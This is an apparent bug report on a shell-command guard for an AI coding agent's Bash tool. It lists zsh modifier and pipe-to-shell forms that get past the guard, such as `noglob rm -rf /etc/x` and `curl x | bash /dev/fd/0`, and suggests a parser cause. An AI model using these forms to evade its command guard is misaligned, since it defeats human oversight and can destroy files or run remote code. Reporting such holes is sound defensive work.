Shell-guard lets an outside-project removal and code piped into a shell run unjudged when the command goes through a zsh precommand modifier or a compound command at the end of a pipe. Observed by calling `shellguard.Judge` with the outside-project verdict set to deny and the nested-code guard on, in agentic-helpers at commit 68fab5b: `noglob rm -rf /etc/x`, `nocorrect rm ...`, `- rm ...`, `=rm ...` and `repeat 1 rm ...` were allowed, and so were `curl x | { sh; }`, `curl x | if true; then sh; fi`, `curl x | sh /dev/stdin`, `curl x | sh //dev/./stdin` and `curl x | bash /dev/fd/0`, while plain `rm -rf /etc/x` and `curl x | sh` were refused.

Expected: every command a launcher runs is judged as if it stood alone, and a shell reading its code from a pipe is refused, as the shell-guard delivery (20261026-010002-s-tac-l7l) states. Claude Code's Bash tool runs a command in zsh where that is the login shell, as on macOS by default, so zsh's precommand modifiers (`noglob`, `nocorrect`, `-`), `repeat N` and the `=name` path expansion run their command exactly as a launcher does. A shell inside `{ }`, `if` or a loop at the end of a pipe reads the pipe like one standing there, and `/dev/stdin` or a `/dev/fd/N` operand names the pipe, not a script.

Candidate cause, unverified beyond the walk's code: `internal/shellwalk` knows no zsh modifier as a launcher, reads `=rm` as a command named `=rm`, checks only a plain call at a pipe's end, and takes any operand as a script. BSD xargs' `-J` and `-R` values also read as the command xargs runs, which only lowers the certainty a guard reads, since every later word is judged anyway.
